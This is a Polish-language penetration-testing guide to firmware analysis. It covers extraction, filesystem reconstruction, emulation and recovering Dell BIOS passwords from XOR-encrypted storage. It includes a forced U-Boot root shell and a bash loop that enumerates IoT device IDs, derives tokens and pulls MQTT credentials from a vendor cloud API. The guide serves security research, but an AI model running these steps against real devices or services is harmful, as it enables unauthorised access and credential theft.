# Analiza firmware’u

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Wprowadzenie**

### Powiązane materiały

Aby pozyskać firmware przez dostępne interfejsy sprzętowe, zobacz [zrzucanie firmware’u przy użyciu konsoli UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) oraz [zrzucanie pamięci flash SPI](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Aby przechwycić dane UART podczas uruchamiania przed uzyskaniem dostępu do konsoli, w powtarzalny sposób, zobacz [sterowanie zasilaniem przez SCPI i pozyskiwanie danych z oscyloskopu](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń, zarządzając komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy wchodzą w interakcję. Jest przechowywany w pamięci trwałej, dzięki czemu urządzenie może uzyskać dostęp do kluczowych instrukcji od momentu włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza firmware’u i jego potencjalna modyfikacja to kluczowe etapy identyfikowania luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>

## **Gromadzenie informacji**

**Gromadzenie informacji** to kluczowy początkowy etap poznawania budowy urządzenia i wykorzystywanych przez nie technologii. Proces ten obejmuje zbieranie danych na temat:

- Architektury CPU i uruchomionego systemu operacyjnego
- Szczegółów dotyczących bootloadera
- Układu sprzętowego i dokumentacji technicznej
- Metryk bazy kodu i lokalizacji kodu źródłowego
- Bibliotek zewnętrznych i typów licencji
- Historii aktualizacji i certyfikatów zgodności z przepisami
- Diagramów architektury i przepływu danych
- Ocen bezpieczeństwa i zidentyfikowanych luk w zabezpieczeniach

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza dostępnych komponentów oprogramowania open source z użyciem ręcznych i zautomatyzowanych metod przeglądu. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie firmware’u**

Firmware można pozyskać na różne sposoby, z których każdy wiąże się z innym poziomem złożoności:

- **Bezpośrednio** ze źródła (od programistów lub producentów)
- **Budując** go na podstawie udostępnionych instrukcji
- **Pobierając** go z oficjalnych stron pomocy technicznej
- Używając zapytań **Google dork** do wyszukiwania udostępnionych plików firmware’u
- Uzyskując bezpośredni dostęp do **cloud storage** za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
- **Zrzucając** firmware z urządzenia przez połączenia takie jak **UART**, **JTAG** lub **PICit**
- **Nasłuchując** żądań aktualizacji w komunikacji urządzenia
- Identyfikując i wykorzystując **zakodowane na stałe endpointy aktualizacji**
- **Zrzucając** firmware z bootloadera lub przez sieć
- **Wyjmując i odczytując** układ pamięci, gdy wszystkie inne metody zawiodą, przy użyciu odpowiednich narzędzi sprzętowych

### Logi dostępne wyłącznie przez UART: wymuś root shell przez zmienne środowiskowe U-Boot w pamięci flash

Jeśli UART ignoruje dane wejściowe (udostępnia tylko logi), nadal można wymusić uruchomienie powłoki init, **edytując offline blob środowiska U-Boot**:<sup>[[6]](#references)</sup>

1. Zrzuć zawartość pamięci flash SPI za pomocą klipsa SOIC-8 i programatora (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Znajdź partycję env U-Boot, edytuj `bootargs`, aby dodać `init=/bin/sh`, i **ponownie oblicz CRC32 env U-Boot** dla blobu.
3. Ponownie zaprogramuj tylko partycję env i uruchom ponownie urządzenie; powłoka powinna pojawić się na UART.

Jest to przydatne w przypadku urządzeń wbudowanych, w których powłoka bootloadera jest wyłączona, ale partycję env można zapisywać za pomocą zewnętrznego dostępu do pamięci flash.

## Analiza firmware

Teraz, gdy **masz firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak go analizować. Możesz do tego użyć różnych narzędzi:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Jeśli przy użyciu tych narzędzi niewiele znajdziesz, sprawdź **entropię** obrazu za pomocą `binwalk -E <bin>`. Niska entropia oznacza, że obraz prawdopodobnie nie jest zaszyfrowany. Wysoka entropia sugeruje, że jest zaszyfrowany (lub w jakiś sposób skompresowany).

Możesz też użyć tych narzędzi, aby wyodrębnić **pliki osadzone w firmware**:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz również użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), aby sprawdzić plik.

### Analiza różnicowa flash i odzyskiwalne magazyny sekretów XOR

Jeśli format przechowywania ustawienia firmware nie jest udokumentowany, najpierw wykonaj kilka odczytów flash dla tego samego stanu, zmień **dokładnie jedno** ustawienie, ponownie zrzutuj zawartość całego układu i porównaj offsety. Powtarzanie eksperymentu z kontrolowanymi wartościami pozwala odróżnić zmiany dotyczące ustawienia od liczników i metadanych zapisu; zmiany pojawiające się pod nowymi offsetami, zamiast w miejscu, wskazują na magazyn typu append-only lub o strukturze dziennika. Zachowaj usunięte wpisy i wpisy oznaczone jako tombstone, ponieważ ich bajty mogą nadal nadawać się do odzyskania.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Po zlokalizowaniu regionu wyodrębnij moduły firmware'u za pomocą narzędzi takich jak `binwalk` i przeanalizuj w Ghidra kod zapisujący i walidujący dane. Potwierdź w kodzie granice pól, dopełnienie, indeksowanie klucza i wyprowadzanie klucza, zamiast wnioskować o schemacie wyłącznie na podstawie wzorców w szyfrogramie.<sup>[[12]](#references)</sup>

#### Odzyskiwanie kluczy z zaszyfrowanego dopełnienia zerami

Jak opisano w [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), znany tekst jawny ujawnia bajty strumienia klucza na tych samych pozycjach. Stałej długości pole jest szczególnie podatne, gdy jego dopełnienie zerami obejmuje wszystkie indeksy powtarzającego się klucza XOR: zaszyfrowane dopełnienie ujawnia bezpośrednio te bajty klucza, ponieważ `0x00 XOR key_byte = key_byte`. Jeśli uwzględnione są wszystkie indeksy klucza, odtwórz klucz z końcówki szyfrogramu i odszyfruj wypełnione bajty.<sup>[[12]](#references)</sup>

Format hasła BIOS-u DVAR firmy Dell, podatny na ataki, jest konkretnym przykładem: bajt `0` pola o długości 32 bajtów jest tekstem jawnym, natomiast bajty `1..31` używają powtarzającego się klucza o długości 20 bajtów.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Dla hasła o długości `L` pozycje `L..31` miały przed operacją XOR wartość zero. Gdy `L <= 12`, pozycje te obejmują każdy indeks klucza, więc cały klucz i hasło można odzyskać bez brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Odzyskiwanie kluczy z historycznych rekordów

Nie analizuj każdego rekordu niezależnie. Klucz DVAR jest w przybliżeniu wyprowadzany jako `modified_md5(device_seed || variable_GUID || password[0])`: seed urządzenia i GUID są stałe, a jedynym wejściem zależnym od hasła jest jego pierwszy bajt w postaci jawnej. Daje to maksymalnie 256 kluczy na urządzenie, a rekordy zaczynające się od tego samego bajtu współdzielą klucz. Pogrupuj aktywne i usunięte rekordy według tego bajtu; krótki rekord historyczny może ujawnić cały klucz przez padding i posłużyć do odszyfrowania bieżącego, dłuższego rekordu, którego własny padding nie wystarcza. Rotacja hasła może więc zwiększyć ekspozycję, gdy stary szyfrogram zostanie oznaczony jako usunięty, zamiast wymazany.<sup>[[12]](#references)</sup>

Narzędzie [`dellpwn`](https://github.com/R3n5k1/dellpwn) lokalizuje DVAR, weryfikuje potencjalne rekordy, odzyskuje hasła i może wyświetlać surowe bajty zapisanych danych i klucza. Skompiluj je z kopii repozytorium i przeskanuj zweryfikowany obraz flash w następujący sposób:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

W przypadku niestandardowych parserów odrzucaj fałszywe trafienia na podstawie struktury rekordów, wymagań dotyczących drukowalnych znaków, kontroli dopełnienia zerami, entropii klucza oraz spójności w miejscu, w którym klucz zawija się do początku. Jeśli powtarzane zrzuty pokazują nieliczne zmiany bitów przy każdym zapisie, wylicz zaobserwowane maski i uszereguj możliwe poprawki według tych kryteriów, ale zgłaszaj niejednoznaczne znaki zamiast przedstawiać wynik heurystyczny jako dokładne odzyskanie.<sup>[[12]](#references)</sup>

Weryfikatory haseł powinny przechowywać solony, iterowany hash jednokierunkowy zamiast odwracalnego szyfrogramu, a magazyny o strukturze dziennika powinny bezpiecznie usuwać zastąpione materiały tajne.<sup>[[12]](#references)</sup>

### Uzyskiwanie systemu plików

Przy użyciu wcześniej omówionych narzędzi, takich jak `binwalk -ev <bin>`, powinna być możliwa **ekstrakcja systemu plików**.\
Binwalk zwykle wypakowuje go do **folderu o nazwie odpowiadającej typowi systemu plików**, którym najczęściej jest jeden z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczna ekstrakcja systemu plików

Czasami binwalk **nie ma sygnatury bajtów magicznych systemu plików**. W takich przypadkach użyj binwalk, aby **znaleźć przesunięcie systemu plików i wyciąć skompresowany system plików** z pliku binarnego, a następnie **ręcznie go wypakuj** zgodnie z jego typem, wykonując poniższe kroki.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Uruchom następujące **polecenie dd**, aby wydzielić system plików Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatywnie można też uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki znajdą się później w katalogu "`squashfs-root`".

- Pliki archiwów CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs z pamięcią flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Odtwarzanie podzielonych wbudowanych systemów plików root

Jeśli surowy zrzut eMMC/SSD zawiera prawidłowy nagłówek systemu plików, ale przesunięcia metadanych wykraczają poza nominalną partycję, nie klasyfikuj go od razu jako uszkodzonego. Wbudowany kod rozruchowy może złożyć właściwe urządzenie root z wielu zakresów fizycznych za pomocą Device Mapper, dlatego pozyskanie danych z jednej partycji GPT obejmuje tylko pierwszy segment.<sup>[[9]](#references)</sup>

#### Wstępna analiza kompletnego obrazu nośnika

Najpierw upewnij się, że pozyskiwanie danych zostało zakończone, rozmiar obrazu jest stabilny i żaden proces zapisu nadal go nie używa. Jeśli nazwa pliku zawiera adres początkowy/końcowy, porównaj ten zakres z rzeczywistą liczbą bajtów. Odzyskaj GPT w trybie tylko do odczytu i dołącz tylko wymagany zakres; **nie** uruchamiaj `vgchange -ay` dla niezaufanego woluminu fizycznego na stacji roboczej, ponieważ może dojść do kolizji grup woluminów i niezamierzonych zapisów.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferuj jednorazową maszynę wirtualną, gdy oryginalna logika init lub stos LVM musi mieć dostęp do całego obrazu. Historyczne logi rozruchu ze standardowej partycji rozruchowej są szczególnie przydatne: bootloader mógł zapisać przesunięcia w zastrzeżonym kontenerze, długości komponentów, wybór slotu, reguły wyrównania i weryfikację podpisu. Użyj tych wartości, aby wyodrębnić osadzoną linię poleceń, kernel i initramfs, a następnie niezależnie zweryfikuj każdy wynik za pomocą `file`, bajtów sygnatury i `binwalk`; odczyt do końca kontenera może przypadkowo dołączyć do kernela initrd, obiekt ACPI lub podpis.<sup>[[9]](#references)</sup>

#### Odtwórz mapę bloków używaną podczas rozruchu

Wyodrębnij initramfs kernela i przeanalizuj wstecz jego `/init` oraz wszystkie biblioteki pamięci masowej. W [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) śledź odwołania do ciągów `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` i ścieżek partycji; następnie prześledź kod, który wybiera aktywny slot A/B i tworzy tabelę. Przydatne polecenia startowe radare2 to `r2 -A init`, `afl`, `pdf @ main` i `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Cel linear mapuje kolejne zakresy urządzenia wirtualnego na zakresy jednego lub większej liczby urządzeń bazowych. Odzyskana tabela z dwoma segmentami często ma następującą postać (wszystkie pozycje i długości podano w sektorach po 512 bajtów):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Odtwórz dokładnie arytmetykę kodu maszynowego, w tym szerokość liczb całkowitych, przesunięcia i konwersje jednostek. Na przykład poniższe wyrażenie zaokrągla rozmiar w bajtach w dół do granicy 4 KiB, a dopiero potem konwertuje go na sektory 512-bajtowe; zastąpienie go przez `p4_bytes // 512` przesuwa wybrany końcowy fragment o `p4_bytes % 4096`, gdy partycja nie jest wyrównana do rozmiaru strony.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Odtwórz płaski obraz analityczny, kopiując zakresy w kolejności tabeli, porcjami o ograniczonym rozmiarze, zamiast wczytywać cały zrzut nośnika do pamięci. Pozwala to również uniknąć tworzenia urządzeń mappera po stronie hosta. Zachowaj offsety wyznaczone na podstawie GPT, odwrócone liczby sektorów i wynikową długość wyjściową jako osobne asercje.<sup>[[9]](#references)</sup>

#### Odróżnij uszkodzenie od stałego błędu rekonstrukcji

W przypadku SquashFS sprawdź sygnaturę `hsqs` i zdekoduj 64-bitowe pole `bytes_used` w formacie little-endian z offsetu 40 superbloku, zanim uruchomisz `unsquashfs`. Jeśli ekstrakcja nie powiedzie się w kilku niezwiązanych ze sobą strukturach, przeszukaj szerokie okno wokół oczekiwanych pozycji i wymagaj mocnych kandydatów strukturalnych: bloku metadanych, który można zdekompresować, kilku kolejnych prawidłowych wpisów katalogu, wiarygodnych pól inode, inode głównego zgodnego z liczbą inode’ów lub prawidłowej struktury metadanych integralności. Pojedyncze dopasowanie sygnatury nie wystarczy.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Gdy ta sama signed delta sprawia, że niezależne struktury stają się poprawne — na przykład metadane katalogu i rekord verity — prawdopodobną przyczyną jest systematyczny błąd początku segmentu, a nie brakujące bajty. Wróć do odwróconych obliczeń i poszukaj pominiętych reszt z dzielenia, problemów z interpretacją znaku, przepełnienia lub zaokrąglania do granicy sektora albo strony, zanim spróbujesz odzyskiwać osierocone dane lub modyfikować metadane systemu plików.<sup>[[9]](#references)</sup>

Na koniec pamiętaj, by rozdzielać granice ochrony: woluminy LUKS z kluczami zapieczętowanymi w TPM chronią poufność danych, natomiast podpisane mapowanie dm-verity chroni integralność głównego systemu plików. Programowy TPM nie pozwala odzyskać klucza zapieczętowanego w oryginalnym fizycznym TPM, a uruchomienie zmodyfikowanego SquashFS przez init przeznaczony wyłącznie do celów badawczych, który pomija weryfikację verity, nie fałszuje jego podpisu ani nie łamie dm-verity.<sup>[[9]](#references)</sup>

## Analiza firmware'u

Po uzyskaniu firmware'u należy go dokładnie przeanalizować, aby zrozumieć jego strukturę i potencjalne podatności. Proces ten obejmuje użycie różnych narzędzi do analizy i wyodrębnienia przydatnych danych z obrazu firmware'u.

### Narzędzia do wstępnej analizy

Poniżej podano zestaw poleceń do wstępnego sprawdzenia pliku binarnego (oznaczonego jako `<bin>`). Polecenia te pomagają określić typy plików, wyodrębniać ciągi znaków, analizować dane binarne oraz zrozumieć szczegóły dotyczące partycji i systemu plików:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Aby ocenić stan szyfrowania obrazu, sprawdza się **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka może wskazywać na szyfrowanie lub kompresję.

Do **wyodrębniania osadzonych plików** zalecane są narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Za pomocą `binwalk -ev <bin>` można zwykle wyodrębnić system plików, często do katalogu o nazwie odpowiadającej typowi systemu plików (np. squashfs, ubifs). Jeśli jednak **binwalk** nie rozpoznaje typu systemu plików z powodu braku bajtów magicznych, konieczne jest ręczne wyodrębnienie. Polega ono na użyciu `binwalk` do zlokalizowania przesunięcia systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Później, zależnie od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), do ręcznego wyodrębniania zawartości używa się różnych poleceń.

### Analiza systemu plików

Po wyodrębnieniu systemu plików rozpoczyna się poszukiwanie luk w zabezpieczeniach. Zwraca się uwagę na niezabezpieczone demony sieciowe, zakodowane na stałe dane uwierzytelniające, punkty końcowe API, funkcje serwerów aktualizacji, nieskompilowany kod, skrypty startowe oraz skompilowane pliki binarne do analizy offline.

**Najważniejsze lokalizacje** i **elementy** do sprawdzenia:

- **etc/shadow** i **etc/passwd** w poszukiwaniu danych uwierzytelniających użytkowników
- Certyfikaty i klucze SSL w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
- Wbudowane pliki binarne do dalszej analizy
- Typowe serwery WWW i pliki binarne urządzeń IoT

W analizie systemu plików pod kątem poufnych informacji i luk pomagają następujące narzędzia:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych plików binarnych

Zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w systemie plików należy dokładnie sprawdzić pod kątem luk. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix i **PESecurity** dla plików binarnych Windows pomagają identyfikować niezabezpieczone pliki binarne, które można wykorzystać do ataku.

## Pozyskiwanie konfiguracji cloud i danych uwierzytelniających MQTT za pomocą tokenów URL wyliczanych na podstawie danych

Wiele hubów IoT pobiera konfigurację przypisaną do danego urządzenia z punktu końcowego cloud o postaci:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware można odkryć, że wartość `<token>` jest lokalnie wyliczana na podstawie identyfikatora urządzenia przy użyciu zakodowanego na stałe sekretu, na przykład:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Taka konstrukcja umożliwia każdemu, kto pozna deviceId i STATIC_KEY, odtworzenie URL i pobranie konfiguracji cloud, która często ujawnia dane uwierzytelniające MQTT w postaci jawnej oraz prefiksy tematów.

Praktyczny przebieg:

1) Wyodrębnij deviceId z logów rozruchowych UART

- Podłącz adapter UART 3.3V (TX/RX/GND) i przechwyć logi:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Poszukaj wierszy wyświetlających wzorzec URL konfiguracji chmurowej oraz adres brokera, na przykład:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Odzyskaj STATIC_KEY i algorytm tokenu z firmware

- Załaduj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wyznacz token w Bashu i zamień skrót na wielkie litery:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Zbierz konfigurację chmury i dane uwierzytelniające MQTT

- Złóż URL i pobierz JSON za pomocą curl; przeanalizuj go przez jq, aby wyodrębnić sekrety:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Nadużywanie MQTT przesyłanego jawnym tekstem i słabych ACL dla topiców (jeśli występują)

- Użyj odzyskanych danych uwierzytelniających, aby subskrybować topiki serwisowe i wyszukiwać poufne zdarzenia:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Wyliczanie przewidywalnych identyfikatorów urządzeń (na dużą skalę, za zgodą)

- Wiele ekosystemów osadza bajty OUI producenta, produktu i typu, po których następuje sekwencyjny sufiks.
- Możesz iterować po kandydujących identyfikatorach, programowo wyprowadzać tokeny i pobierać konfiguracje:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Uwagi
- Zawsze uzyskaj wyraźną zgodę przed podjęciem próby masowej enumeracji.
- Jeśli to możliwe, preferuj emulację lub analizę statyczną w celu odzyskania sekretów bez modyfikowania sprzętu docelowego.

Proces emulacji firmware umożliwia przeprowadzenie **dynamic analysis** działania urządzenia lub pojedynczego programu. Podejście to może wiązać się z wyzwaniami wynikającymi z zależności od sprzętu lub architektury, ale przeniesienie głównego systemu plików lub określonych plików binarnych na urządzenie o zgodnej architekturze i kolejności bajtów, takie jak Raspberry Pi, lub do gotowej maszyny wirtualnej może ułatwić dalsze testy.

### Emulowanie pojedynczych plików binarnych

Podczas analizowania pojedynczych programów kluczowe jest określenie ich kolejności bajtów i architektury CPU.

#### Przykład z architekturą MIPS

Aby emulować plik binarny dla architektury MIPS, można użyć polecenia:

```bash
file ./squashfs-root/bin/busybox
```

Aby zainstalować niezbędne narzędzia do emulacji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

W przypadku MIPS (big-endian) używa się `qemu-mips`, a dla plików binarnych little-endian wybiera się `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku plików binarnych ARM proces jest podobny — do emulacji używa się emulatora `qemu-arm`.

### Emulacja pełnego systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne ułatwiają pełną emulację firmware, automatyzując ten proces i wspomagając analizę dynamiczną.

### Odtwarzanie podzielonych i weryfikowanych systemów plików root na potrzeby emulacji

Jeśli superblok SquashFS można odczytać, ale przesunięcia inode’ów, katalogów lub tablicy fragmentów są niemożliwe, nie modyfikuj od razu `unsquashfs`. Przeanalizuj wczesny plik binarny rozruchu i odtwórz tworzony przez niego graf urządzeń blokowych: systemy wbudowane mogą udostępniać nominalną partycję root, ale tworzyć właściwy system plików za pomocą mapowania `dm-linear`, które dołącza sektory pobrane z innej partycji. Kontrole obejmujące tylko superblok mogą się powieść, nawet gdy wszystkie późniejsze bloki metadanych są przesunięte.<sup>[[11]](#references)</sup>

Zachowaj dokładnie sposób wykonywania obliczeń przez firmware. Ustal w szczególności, czy długości podawane są w bajtach, sektorach 512-bajtowych czy stronach 4 KiB; odtwórz przesunięcia bitowe i obcinanie wartości w ich oryginalnej kolejności; uwzględnij też zależne od banku końcowe obszary w układach A/B. Na przykład `(partition_bytes >> 12) << 3` najpierw obcina wartość do granicy 4 KiB, a dopiero potem wyraża wynik w sektorach 512-bajtowych; zastąpienie tego przez `partition_bytes // 512` może przesunąć dołączany obszar o kilka kilobajtów i uszkodzić wszystkie dalsze tablice SquashFS.<sup>[[11]](#references)</sup>

Przydatny proces walidacji:<sup>[[11]](#references)</sup>

1. Odtwórz z pliku binarnego weryfikatora/init urządzenie źródłowe, sektor początkowy i długość każdego segmentu `dm-linear`.
2. Połącz lub zamapuj obszary, nie zmieniając zasad ich wyrównania.
3. Jeśli ekstrakcja nadal się nie powiedzie, przeszukaj tylko niewielki zakres wokół przewidywanej granicy i wymagaj kilku kolejnych poprawnych struktur metadanych, zamiast uznawać sam wiarygodnie wyglądający superblok za wystarczający.
4. Uruchom niezmodyfikowane `unsquashfs` na odtworzonym obrazie; poprawne przejście przez wszystkie katalogi i fragmenty jest mocniejszym dowodem niż wynik `unsquashfs -stat`.

#### Zastąpienie dm-verity kontrolowane przez analityka

Gdy analityk kontroluje jądro QEMU, initramfs i dyski wirtualne, zmodyfikowany root można uruchomić, zastępując weryfikujący PID 1 producenta niewielkim, statycznie linkowanym init. Jest to **podmiana łańcucha rozruchowego w laboratorium**, a nie złamanie dm-verity, jego podpisu RSA, Secure Boot ani klucza zabezpieczonego przez TPM.<sup>[[11]](#references)</sup>

Zastępczy init powinien odtworzyć operacyjne elementy oryginalnej ścieżki rozruchu: zamontować `devtmpfs`, wywołać `setsid()`, połączyć `/dev/console` z deskryptorami plików 0–2, zamontować `/proc` i `/sys`, zaczekać na dostarczone urządzenie blokowe, zamontować zmodyfikowany root w trybie tylko do odczytu, odłączyć pseud systemy plików starego root, przenieść nowy punkt montowania na `/`, wykonać `chroot` i uruchomić `execve()` z oryginalnym `/sbin/init` firmware. Odłączenie `/dev`, `/proc` i `/sys` **przed** `MS_MOVE` zapobiega przypadkowemu odłączeniu punktów montowania należących do nowego root.<sup>[[11]](#references)</sup>

Oddziel zmienny stan urządzenia od zmodyfikowanego, niezmiennego root. Nakładka qcow2 może zachować stan LVM oryginalnego dysku, a drugi dysk virtio tylko do odczytu może udostępniać zmodyfikowany SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugowanie stanu obrazu offline

Sprawdź trwały stan poza systemem gościa, gdy powolne uruchamianie, destrukcyjne skrypty startowe lub zawodny zapis w konsoli utrudniają ustalenie przyczyny awarii. Nigdy nie podłączaj nakładki używanej przez działającą maszynę wirtualną; udostępnij ją za pomocą `qemu-nbd`, ogranicz wykrywanie LVM do odpowiedniej partycji NBD i dezaktywuj grupę woluminów przed odłączeniem.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
